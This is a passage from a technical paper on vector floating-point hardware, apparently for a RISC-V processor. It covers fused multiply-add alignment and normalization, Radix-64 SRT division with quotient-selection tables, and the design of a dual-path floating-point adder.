    &lt;p&gt;The \(rshift\_result\) of the significand of \(fp\_c\) after right-shifting must be added to the two results compressed by \(CSAn\_2\). Since the signs of \(fp\_c\) and \(fp\_a \times fp\_b\) may differ, subtraction is performed when they are opposite, and the result may be negative. To determine the sign, an additional sign bit is appended. \(fp\_c\_rshiftValue\_inv\) selects either \(rshift\_result\) (with a \(0\) sign bit) or its negation (with a \(1\) sign bit) based on whether the signs differ. Thus, \(fp\_c\_rshiftValue\_inv\) is added to the two results compressed by \(CSAn\_2\). However, during subtraction, \(fp\_c\_rshiftValue\_inv\) only negates \(rshift\_result\), and a \(+1\) is required at the least significant bit when all right-shifted \(grs\) bits are \(0\). This \(+1\) is placed in the \(carry\) bit of the two results compressed by \(CSAn\_2\), as the \(carry\) bit is always \(0\), saving adder usage and area. The three numbers have different bit widths: the right-shifted significand of \(fp\_c\) has a width of \(3 \times significandWidth + 4\), while the two results compressed by \(CSAn\_2\) have a width of \(2 \times significandWidth + 1\) (the \(+1\) accounts for the partial product extension to ensure correct carry). The strategy for summing these three numbers involves first compressing the lower \(2 \times significandWidth + 1\) bits of the \(CSAn\_2\) results and the lower \(2 \times significandWidth\) bits of \(rshift\_result\) (with a \(0\) appended to form \(2 \times significandWidth + 1\) bits) using \(CSA3\_2\) compression. The two compressed results are then summed, denoted as \(adder\_low\_bits\). Simultaneously, the higher \(significandWidth + 4\) bits of \(rshift\_result\) are incremented by \(1\). The final result selects either the higher \(significandWidth + 4\) bits of \(fp\_c\_rshiftValue\_inv\) or its incremented version based on whether the highest bit of the lower \(2 \times significandWidth + 1\) sum is \(1\), denoted as \(adder\_high\_bits\).&lt;/p&gt;
    &lt;p&gt;Additionally, consider the inversion and increment by one of the right-shifted \(grs\) during subtraction. The final significand addition result \(adder\) (including the right-shifted \(grs\)) consists of: \(adder\_high\_bits\), \(adder\_low\_bits\), and the right-shifted \(grs\) (inverted and incremented by one for subtraction). Since \(adder\) may be negative, an extra \(1\)-bit is extended solely for sign determination of \(adder\), which is later discarded. \(adder\_inv\) inverts \(adder\) when it is negative and removes this sign bit.&lt;/p&gt;
    &lt;head rend="h5"&gt;\(LZD\), left shift, rounded and unrounded mantissa results&lt;/head&gt;
    &lt;p&gt;After computing \(adder\_inv\), a leading-zero detection must be performed on \(adder\_inv\) to determine the number of left shifts required, thereby normalizing and rounding the mantissa result.&lt;/p&gt;
    &lt;p&gt;When performing LZD on \(adder\_inv\), there is an issue of exponent limitation. Let \(E\_greater\) be \(Eab\) (the exponent result from multiplying \(fp\_a\) and \(fp\_b\)). The left shift amount cannot exceed \(E\_greater\) because the exponent result would already be all zeros at that point. To address this, similar to the floating-point adder, a \(mask\) is used during left shift to limit the shift amount.&lt;/p&gt;
    &lt;p&gt;For cases where \(adder\) is negative, \(-adder\) should be the inversion of \(adder\) plus \(1\). Since adding \(1\) would create a long carry chain, only the inversion is performed, and then the \(LZD\) of \(adder\_inv\) is calculated. This may result in a one-bit deviation. When the inversion of \(adder\) ends with consecutive \(1\)s, adding \(1\) would cause a carry at the highest bit. To resolve this one-bit deviation, a trailing zero detection (\(TZD\)) is performed on \(adder\). If \(LZD + TZD\) equals the width of \(adder\), the inversion of \(adder\) ends with consecutive \(1\)s, requiring a correction to the left-shift result. After the left-shift correction, the unrounded result is obtained, and adding \(1\) to it yields the rounded result.&lt;/p&gt;
    &lt;head rend="h5"&gt;Final result&lt;/head&gt;
    &lt;p&gt;The sign bit result is determined based on the sign of \(adder\), while the calculation of \(grs\) requires combining both the right-shift process in step five and the left-shift process in step seven. The rounding strategy employs \(after \quad rounding\). To detect \(underflow\), an additional set of \(grs\) specifically for \(underflow\) checking is used. Based on the rounding mode and \(grs\), the necessity of rounding is determined, selecting the final mantissa result. The exponent result is derived according to the rounding outcome.&lt;/p&gt;
    &lt;p&gt;When input operands contain special values such as \(NaN\), infinity, or zero, the result is calculated separately. Depending on the actual input values, either the special result or the normal result is selected. Except for the divide-by-zero flag, all four other flag results can be generated.&lt;/p&gt;
    &lt;head rend="h4"&gt;Vector single-precision format algorithm&lt;/head&gt;
    &lt;p&gt;The main design principle for vector operations is to share hardware where timing requirements are met.&lt;/p&gt;
    &lt;p&gt;During Booth encoding, \(f16\) generates 6 partial products (pp), \(f32\) generates 13 pp, and \(f64\) generates 27 pp. Thus, the 27 pp positions generated by \(f64\) during Booth encoding can accommodate two sets of 13 pp from \(f32\), and similarly, the 13 pp positions from \(f32\) can hold two sets of 6 pp from \(f16\). This allows continued sharing of a single \(CSA\_27to2\) compression unit. The vector shared Booth encoding is illustrated in the figure.&lt;/p&gt;
    &lt;p&gt;During the right shift of the \(fp\_c\) mantissa, one of the right shifts for the mantissas in \(f64\) and \(f32\) can share a single shifter, while the other shifters remain independent.&lt;/p&gt;
    &lt;p&gt;The \(CSA\_3to2\) is also shared, with the third operand derived from the right-shifted result of the \(fp\_c\) mantissa. The right-shifted results of two \(f32\) or four \(f16\) mantissas are concatenated and then compressed with the two operands from the shared \(Booth\) encoding for \(3\_2\) compression.&lt;/p&gt;
    &lt;p&gt;The adder after compression is also shared. Different formats are assigned different bits, and the bits are separated to prevent low-bit carries from affecting high-bit results.&lt;/p&gt;
    &lt;p&gt;The shared logic for \(LZD\), \(TZD\), and the left shifter is similar to the right shifter, with \(f64\) and \(f32\) sharing one unit while others remain independent.&lt;/p&gt;
    &lt;head rend="h4"&gt;Vector Mixed-Precision Format Algorithm&lt;/head&gt;
    &lt;p&gt;There are two types of vector mixed-precision format calculations:&lt;/p&gt;
    &lt;p&gt;(1) \(2\) instances of \(fp32 = fp16 × fp16 + fp32\);&lt;/p&gt;
    &lt;p&gt;(2) One \(fp64 = fp32 × fp32 + fp64\).&lt;/p&gt;
    &lt;p&gt;For two multipliers of the same width, the essence is still adding exponents and multiplying significant bits. Unlike floating-point addition, there's no need to first convert their formats to match the result's format. Simply extending the bit width suffices—padding the exponent's high bits with zeros and the mantissa's low bits with zeros to align with high-precision floating-point operands. After alignment, computation proceeds according to the single-precision format.&lt;/p&gt;
    &lt;head rend="h3"&gt;Vector floating-point division algorithm&lt;/head&gt;
    &lt;p&gt;Division is one of the most representative floating-point functions in modern processors. There are two main algorithms for computing division in hardware: digit iteration algorithms based on subtraction with linear convergence, and multiplicative algorithms based on multiplication with quadratic convergence. The subtraction-based digit iteration algorithms are more energy-efficient and require less area. Subsequent references to digit iteration in this paper refer to subtraction-based digit iteration. For common floating-point precisions—double, single, and half—digit iteration methods are significantly faster. In digit iteration division, the most critical aspect is the selection of quotient bits, where each iteration yields one bit of the quotient. To implement a simple \(Radix-4\) selection function independent of the divisor, the divisor must be adjusted to a value sufficiently close to 1. This scaling is performed before digit iteration.&lt;/p&gt;
    &lt;p&gt;Digital iterative algorithms are widely used in high-performance processors due to their excellent trade-offs in performance, area, and power consumption. This paper is based on the \(SRT\) division (\(Sweeney-Robertson-Tocher Division\)), employing a \(Radix-64\) floating-point division algorithm that computes \(6\) quotient bits per cycle. To reduce overhead, each \(Radix-64\) iteration consists of three \(Radix-4\) iterations. Speculative algorithms are used between consecutive \(Radix-4\) iterations to reduce latency.&lt;/p&gt;
    &lt;head rend="h4"&gt;Scalar floating-point division algorithm&lt;/head&gt;
    &lt;p&gt;The \(Radix-64\) scalar floating-point division algorithm implemented in this paper has low latency for double-precision, single-precision, and half-precision floating-point division when both input operands and results are normalized numbers, with latencies of \(11\), \(6\), and \(4\) cycles, respectively, including scaling and rounding cycles. In cases where input operands or results include denormalized numbers, one or two additional normalization cycles are required.&lt;/p&gt;
    &lt;p&gt;The exponent result can be easily derived, with the focus being on the division of significands. The significand divider performs floating-point division of the dividend significand \(x\) by the divisor significand \(d\) to obtain the significand quotient \(q = x/d\). Both operands need to be normalized numbers, \(x, d ∈ [1, 2)\). Denormalized operands are also permitted, with normalization applied before the digital iteration. If both operands are normalized within \([1, 2)\), the result lies within \([0.5, 2)\). Thus, two bits to the right of the least significant bit (\(LSB\)) of the quotient are required for rounding, namely the guard bit and the rounding bit.&lt;/p&gt;
    &lt;p&gt;When the result is normalized, the guard bit is used for rounding, with \(q ∈ [1, 2)\). When the result is unnormalized, the rounding bit is used for rounding, with \(q ∈ [0.5, 1)\). In the latter case, the result is left-shifted by \(1\) bit, and the guard and rounding bits become the \(LSB\) and guard bit of the normalized result, respectively. To simplify rounding, the result is forced to \(q ∈ [1, 2)\). Note that \(q &amp;lt; 1\) only occurs when \(x &amp;lt; d\). This condition is detected early, and the dividend is left-shifted by \(1\) bit, making \(q = 2 × x/d\) and \(q ∈ [1, 2)\). Note that the exponent result must be adjusted accordingly.&lt;/p&gt;
    &lt;p&gt;The algorithm used for division is the \(Radix-4\) digit iteration algorithm, with three iterations per cycle. The quotient's signed-digit representation uses the digit set {\(−2, −1, 0, +1, +2\)}, meaning the radix \(r = 4\) and the digit set \(a = 2\). In each iteration, a digit of the quotient is obtained through a selection function. To have a quotient digit selection function independent of the divisor, the divisor must be scaled to be close to \(1\). Naturally, to maintain result correctness, the dividend must be scaled by the same factor as the divisor.&lt;/p&gt;
    &lt;p&gt;Using the radix\(-4\) algorithm, each iteration yields 2 bits of the quotient. Since three radix\(-4\) iterations are performed per clock cycle, 6 quotient bits are obtained per cycle, equivalent to a \(Radix-64\) divider. Additionally, note that the first quotient bit of the integer result can only take values {\(+1, +2\)}, and its computation is much simpler than that of the remaining bits. By computing it in parallel with operand prescaling, one single-precision floating-point iteration is saved. On the other hand, there is an early termination mode for exceptional operands. Early termination is triggered when any operand is \(NaN\), infinity, or zero, or when dividing by a power of 2 with both operands normalized. In the latter case, the result is obtained simply by reducing the exponent of the dividend. The main features of the \(Radix-64\) divider are as follows:&lt;/p&gt;
    &lt;p&gt;(1) Pre-scaling of divisor and dividend.&lt;/p&gt;
    &lt;p&gt;(2) The first quotient digit is executed in parallel with pre-scaling.&lt;/p&gt;
    &lt;p&gt;(3) Compare the scaled dividend and divisor, and left-shift the dividend to obtain a result in the range \([1, 2)\).&lt;/p&gt;
    &lt;p&gt;(4) Three \(Radix-4\) iterations per cycle, processing \(6\) bits each cycle.&lt;/p&gt;
    &lt;p&gt;(5) Supports half-precision, single-precision, and double-precision.&lt;/p&gt;
    &lt;p&gt;(6) Denormal number support requires an additional cycle for normalization before iteration.&lt;/p&gt;
    &lt;p&gt;(7) Early termination for exceptional operands.&lt;/p&gt;
    &lt;head rend="h5"&gt;Digit-Recurrence Division Algorithm&lt;/head&gt;
    &lt;p&gt;Digit-recurrence division is an iterative algorithm where each iteration computes a \(radix-r\) quotient digit \(q_{i+1}\) and a remainder. The remainder \(rem[i]\) is used to obtain the next \(radix-r\) digit. For fast iteration, the remainder is stored in a carry-save adder using a signed-digit redundant representation. This paper selects a \(radix-2\) signed-digit representation for the remainder, consisting of a positive and a negative number. For radix \(r =4\), the following expression represents the partial quotient before the \(i\)-th iteration:&lt;/p&gt;
    &lt;p&gt;After scaling the divisor to around 1, the \(radix-4\) algorithm describes the quotient and remainder as follows:&lt;/p&gt;
    &lt;p&gt;Here, \(\widehat{rem}[i]\) is an estimate of the remainder \(rem[i]\), which consists of only a few bits. For this algorithm, it has been determined that only the 6 most significant bits (MSB) of the remainder are needed, i.e., 3 integer bits and 3 fractional bits. Then, each iteration extracts a quotient bit from the current remainder and computes a new remainder for the next iteration. The formula below calculates the number of iterations \(it\):&lt;/p&gt;
    &lt;p&gt;Here, \(n\) is the number of bits in the result, including those needed for rounding. The division latency, i.e., the number of cycles, is directly related to the number of iterations. It also depends on the number of iterations performed per cycle. Three iterations per cycle have been implemented to achieve \(6\) bits per cycle, equivalent to \(Radix-64\) division. The cycles (\(cycles\)) required for normalized floating-point numbers are determined by the following formula. In addition to the (\(it/3\)) cycles needed for iterations, there are two extra cycles for operand pre-scaling and rounding.&lt;/p&gt;
    &lt;p&gt;Some examples of digital iterative division, including the \(Radix-4\) algorithm, can be found in [\(38\)]. A simple implementation is shown in the figure. Note that only the most significant bit of the remainder is used to select the quotient bit. The remainder is updated using a carry-save adder (\(CSA\)) and stored in a redundant representation. The quotient bit selection then requires the \(t\) most significant bits of the remainder to be summed in a carry-propagate adder (\(CPA\)) to obtain its non-redundant representation. However, this implementation is too slow. To accelerate the iteration loop, speculative algorithms must be employed for both the remainder computation between iterations and the quotient bit selection.&lt;/p&gt;
    &lt;head rend="h5"&gt;Operand pre-scaling&lt;/head&gt;
    &lt;p&gt;During prescaling, the divisor is scaled to a value close to 1, making the selection of quotient digits independent of the divisor. For the \(radix-4\) algorithm, scaling the divisor to the range \([1 − 1/64, 1+1/8]\) is sufficient. As shown in the prescaling factor truth table, only three bits determine the scaling factor. Note that during prescaling, the divisor should be scaled by a factor of \(1-2\). The dividend should also be scaled by the same factor.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;\(0.1\)xxx&lt;/cell&gt;
        &lt;cell role="head"&gt;Pre-scaling factor&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(000\)&lt;/cell&gt;
        &lt;cell&gt;\(1+1/2+1/2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(001\)&lt;/cell&gt;
        &lt;cell&gt;\(1+1/4+1/2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;010&lt;/cell&gt;
        &lt;cell&gt;\(1+1/2+1/8\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(011\)&lt;/cell&gt;
        &lt;cell&gt;\(1+1/2+0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(100\)&lt;/cell&gt;
        &lt;cell&gt;\(1+1/4+1/8\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(101\)&lt;/cell&gt;
        &lt;cell&gt;\(1+1/4+0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(110\)&lt;/cell&gt;
        &lt;cell&gt;\(1+0+1/8\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(111\)&lt;/cell&gt;
        &lt;cell&gt;\(1+0+1/8\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Integer Quotient Calculation&lt;/head&gt;
    &lt;p&gt;While computing the integer quotient, the following data is provided for the digit iteration steps (each digit iteration performs three \(radix-4\) operations, corresponding to the \(s0\), \(s1\), and \(s2\) stages):&lt;/p&gt;
    &lt;p&gt;(1) Redundant remainder in carry-save representation: \(f\_r\_s\), \(f\_r\_c\).&lt;/p&gt;
    &lt;p&gt;(2) Pre-scaled divisor: \(divisor\).&lt;/p&gt;
    &lt;p&gt;(3) Provides a 6-bit remainder result for the quotient selection in the \(s0\) stage of the first digital iteration.&lt;/p&gt;
    &lt;p&gt;(4) Provides a 7-bit remainder result for the quotient selection in the \(s1\) stage of the first digit iteration.&lt;/p&gt;
    &lt;head rend="h6"&gt;Digital iteration&lt;/head&gt;
    &lt;p&gt;The actual implementation of the floating-point divider requires executing three \(radix-4\) iterations per cycle. Conventional sequential iteration three times is too slow to meet timing requirements, so the logic has been optimized. The figure illustrates the block diagram of the digit-recurrence loop.&lt;/p&gt;
    &lt;p&gt;(1) Process the divisor to obtain five possible quotient selection results, requiring the use of divisor multiples (only negate when the quotient is negative).&lt;/p&gt;
    &lt;p&gt;(2) In the \(s0\) stage, four \(CSA\) modules are used (not required when the quotient is \(0\)) to predictively compute the five remainder redundant representations needed for the \(s1\) stage in parallel during \(s0\).&lt;/p&gt;
    &lt;p&gt;(3) In the \(s0\) stage, using the five remainder redundant representations calculated in the second step, predictively compute five 7-bit remainder results for the \(s2\) stage.&lt;/p&gt;
    &lt;p&gt;(4) In the \(s0\) stage, the quotient for the \(s0\) stage is selected based on the 6-bit remainder result in the input signal. The quotient is represented using a 5-bit one-hot code.&lt;/p&gt;
    &lt;p&gt;(5) Based on the quotient from stage \(s0\), select the redundant remainder representation needed for stage \(s1\), and predictively choose one of the five 7-bit remainder results calculated in step three for stage \(s2\).&lt;/p&gt;
    &lt;p&gt;(6) In the \(s1\) stage, four \(CSA\) modules are used (not required when the quotient is \(0\)), and the five remainder redundant representations needed for the \(s2\) stage are predictively calculated in parallel.&lt;/p&gt;
    &lt;p&gt;(7) In the \(s1\) stage, predictively perform the quotient selection for the \(s1\) stage based on the \(7\)-bit remainder result from the input signal, the divisor multiples used for the five quotient selection results, and the quotient from the \(s0\) stage.&lt;/p&gt;
    &lt;p&gt;(8) Based on the quotient from stage \(s1\), select the redundant remainder representation required for stage \(s2\).&lt;/p&gt;
    &lt;p&gt;(9) In the \(s2\) stage, four \(CSA\) modules are used (not required when the quotient is \(0\)) to predictively compute the five redundant remainder representations needed for the next digit iteration in the \(s0\) stage in parallel.&lt;/p&gt;
    &lt;p&gt;(10) In the s2 stage, predictively compute five possible results for the 6-bit remainder required in the s0 stage and the 7-bit remainder required in the s1 stage of the next digit iteration.&lt;/p&gt;
    &lt;p&gt;(11) In the \(s2\) stage, based on the \(7\)-bit remainder result selected for the \(s2\) stage in the fifth step, the divisor multiples used for the five quotient selection results, and the quotient from the \(s1\) stage, the quotient for the \(s2\) stage is predictively selected.&lt;/p&gt;
    &lt;p&gt;(12) Based on the quotient selection result from the \(s2\) stage, the following are selected for the next digit iteration: the carry-save representation of the redundant remainder, the 6-bit remainder result required for the \(s0\) stage, and the 7-bit remainder result required for the \(s1\) stage.&lt;/p&gt;
    &lt;p&gt;Since the divisor's multiple is only inverted in the first step without \(+1\), there will be a deviation in the remainder calculation. Correction logic is added during the quotient selection process to rectify this. The table below shows the standard quotient selection function, and the subsequent table presents the quotient selection function after logical correction.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;\(4 × rem[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(q_{i+1}\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\([13/8,31/8]\)&lt;/cell&gt;
        &lt;cell&gt;\(+2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\([4/8,12/8]\)&lt;/cell&gt;
        &lt;cell&gt;\(+1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\([-3/8,3/8]\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\([-12/8,-4/8]\)&lt;/cell&gt;
        &lt;cell&gt;\(-1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\([-32/8,-13/8]\)&lt;/cell&gt;
        &lt;cell&gt;\(-2\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;\(4 × rem[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(carry\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(q_{i+1}\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(31/8\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(+2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\([13/8,30/8]\)&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;\(+2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(12/8\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(+2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(12/8\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(+1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\([4/8,11/8]\)&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;\(+1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(3/8\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(+1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(3/8\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\([-3/8,2/8]\)&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(-4/8\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(-4/8\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(-1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\([-12/8, -5/8]\)&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;\(-1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(-13/8\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(-1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(-13/8\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(-2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\([-32/8,14/8]\)&lt;/cell&gt;
        &lt;cell&gt;-&lt;/cell&gt;
        &lt;cell&gt;\(-2\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Convert the redundant remainder representation of the iteratively output digits back to a standard remainder. Use \(On\) \(the\) \(Fly\) \(Conversion\) to compute both the quotient and quotient minus one, calculate two sets of \(grs\) and the signal for whether rounding up is needed, determine the selection signal for choosing between the quotient or quotient minus one, and finally select the correct quotient result. Perform rounding using the correct quotient result and its corresponding rounding-up signal.&lt;/p&gt;
    &lt;head rend="h6"&gt;Denormal numbers and early termination&lt;/head&gt;
    &lt;p&gt;(1) The input contains denormal numbers. The significand of a denormal number is less than \(1\) and cannot be pre-scaled together with normal numbers. Therefore, an additional cycle is added to normalize the significand of denormal numbers while simultaneously adjusting their exponents.&lt;/p&gt;
    &lt;p&gt;(2) The result is a denormal number. The quotient result after digit iteration is greater than 1, which does not meet the denormal significand range. An additional cycle is required to right-shift the quotient result for normalization.&lt;/p&gt;
    &lt;p&gt;(3) Early termination occurs in two scenarios: when the result is \(NaN\), infinity, or exact \(0\), computation can terminate early and output the result since this information is available in the first cycle, allowing the division result to be output in the second cycle; when the divisor is a power of \(2\), its significand \(=1\), and division only requires processing the exponent of the dividend, skipping the digit iteration phase, enabling the division result to be output as early as the second cycle. However, additional cycles are still needed if the dividend or result is a denormal number.&lt;/p&gt;
    &lt;head rend="h4"&gt;Vector floating-point division algorithm&lt;/head&gt;
    &lt;p&gt;For vector floating-point division, the RISC-V vector instruction set extension does not support mixed-precision floating-point division, thus only the following needs to be supported:&lt;/p&gt;
    &lt;p&gt;(1) 1 f64 = f64 + f64;&lt;/p&gt;
    &lt;p&gt;(2) \(2\) \(f32 = f32 + f32\);&lt;/p&gt;
    &lt;p&gt;(3) \(4\) \(f16 = f16 + f16\).&lt;/p&gt;
    &lt;p&gt;Considering that vector division involves multiple division computations simultaneously, and early termination can cause asynchronous output of results unless all cases terminate early under the same conditions, the early termination mechanism is disabled for vector division. If early termination occurs, the result is temporarily stored internally and output simultaneously with other division results.&lt;/p&gt;
    &lt;p&gt;To unify timing, the divider's cycle count is standardized to the worst-case scenario, i.e., when the input contains denormal numbers and the output also contains denormal numbers. Other cases that could produce results faster are internally buffered until the standardized cycle count is reached before outputting the result.&lt;/p&gt;
    &lt;p&gt;The main design employs resource reuse, with the following data reuse in the non-numeric iteration module:&lt;/p&gt;
    &lt;p&gt;(1) \(1\) \(f64/f32/f16 = f64/f32/f16 + f64/f32/f16\);&lt;/p&gt;
    &lt;p&gt;(2) 1 \(f32/f16 = f32/f16 + f32/f16\);&lt;/p&gt;
    &lt;p&gt;(3) \(2\) \(f16\) values \(= f16 + f16\).&lt;/p&gt;
    &lt;p&gt;A total of 4 signal groups are used to achieve the functionality of 7 division groups.&lt;/p&gt;
    &lt;p&gt;Since the digital iteration module is a critical path with significant timing pressure, achieving high reuse with non-digital iteration modules is not feasible without compromising timing requirements. Therefore, a partial reuse design is implemented for the digital iteration module:&lt;/p&gt;
    &lt;p&gt;(1) The interface consists of four sets of quotients and redundant remainders.&lt;/p&gt;
    &lt;p&gt;(2) The \(s0\) stage uses \(7\) sets of \(CSA\) and \(7\) sets of prediction, with \(4\) sets of quotient selection.&lt;/p&gt;
    &lt;p&gt;(3) Stages \(s1\) and \(s2\) utilize \(4\) sets of \(CSA\), \(4\) sets of prediction, and \(4\) sets of quotient selection.&lt;/p&gt;
    &lt;p&gt;Registers also adopt resource reuse. For divisor, redundant remainder, quotient, and other registers, the bit width is allocated based on the maximum required by \(4\) \(f16\), \(2\) \(f32\), or \(1\) \(f64\).&lt;/p&gt;
    &lt;head rend="h2"&gt;Hardware Design&lt;/head&gt;
    &lt;head rend="h3"&gt;Vector Floating-Point Adder&lt;/head&gt;
    &lt;head rend="h4"&gt;Scalar single-precision floating-point adder&lt;/head&gt;
    &lt;p&gt;A scalar single-precision floating-point adder is designed based on the improved dual-path floating-point addition algorithm, with its hardware implementation architecture shown in the figure.&lt;/p&gt;
    &lt;p&gt;The two input operands on the left are \(fp\_a\) and \(fp\_b\), while \(fp\_c\) on the right represents the addition result. \(fflags\) is a 5-bit exception flag, and \(rm\) is the rounding mode, with five modes represented by 3 bits. When \(is\_sub\) is 0, \(fp\_c = fp\_a + fp\_b\) is computed; when \(is\_sub\) is 1, \(fp\_c = fp\_a - fp\_b\) is computed. The difference between floating-point addition and subtraction lies only in the sign bit of \(fp\_b\), so minor adjustments to \(fp\_b\)'s sign bit enable the floating-point adder to support both operations. The overall design consists of three parts: the \(far\) path, the \(close\) path, and the exception path.&lt;/p&gt;
    &lt;p&gt;The far path first performs two parallel normalized exponent subtractions with significand right shifts, handling the cases where Efp_a ≥ Efp_b and Efp_b ≥ Efp_a separately. The correct right-shift result is selected based on the magnitude relationship between Efp_a and Efp_b and sent to the FS0 and FS1 significand adders. For subtraction, the far path sets EA as the larger exponent minus one, while for addition, EA is the larger exponent. This ensures the significand addition result falls within the range [1,4). During the right shift, two sets of grs are computed: grs_normal for rounding when the value is in [1,2), and grs_overflow for rounding when the value is in [2,4). Finally, based on the FS0 result and rounding mode, either FS0 or FS1 is selected as the significand result, and either EA or EA+1 is chosen as the exponent result. The sign bit result is determined by the exponent magnitude. The flag results indicate overflow if EA+1 is all ones and inexactness based on grs. The far path does not generate divide-by-zero, invalid operation, or underflow flags.&lt;/p&gt;
    &lt;p&gt;The \(close\) path uses four significant-digit adders, \(CS0\), \(CS1\), \(CS2\), and \(CS3\), to handle significant-digit subtraction for the cases where \(Efp\_a = Efp\_b\), \(Efp\_a = Efp\_b + 1\), and \(Efp\_a = Efp\_b – 1\). Based on the \(CS0\) result and \(grs\), four one-hot selection signals, \(sel\_CS0\), \(sel\_CS1\), \(sel\_CS2\), and \(sel\_CS3\), are generated. A four-input one-hot multiplexer (\(Mux1H\)) selects one result, which is ORed with the left-shifted \(mask\). A priority left shifter then normalizes the mantissa, outputting the \(lzd\) value during the shift. The exponent result is \(EA – lzd\), and the mantissa result is chosen between the normalized mantissa and \(CS4\), where \(CS4\) is a supplementary rounding result that does not require left-shift normalization. The sign result is derived from the exponent difference and the \(CS0\) result. The flag result only indicates imprecision; no other exception flags are generated.&lt;/p&gt;
    &lt;p&gt;The exception path is used to determine whether the operation is invalid, whether the result is \(NaN\), or whether the result is infinite. When none of these conditions are met, normal computation proceeds, generating a selection signal to choose the result and flags from either the \(far\) path or the \(close\) path as output.&lt;/p&gt;
    &lt;head rend="h4"&gt;Scalar mixed-precision floating-point adder&lt;/head&gt;
    &lt;p&gt;Building upon the scalar single-precision floating-point adder, a mixed-precision hardware design is implemented. The main difference lies in supporting mixed-precision computation. Taking the result as \(f32\) as an example, the table below shows the truth table for the operations corresponding to \(res\_widen\) and \(opb\_widen\).&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;\(res\_widen\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(opb\_widen\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(f32\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(f32 = f32 + f32\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
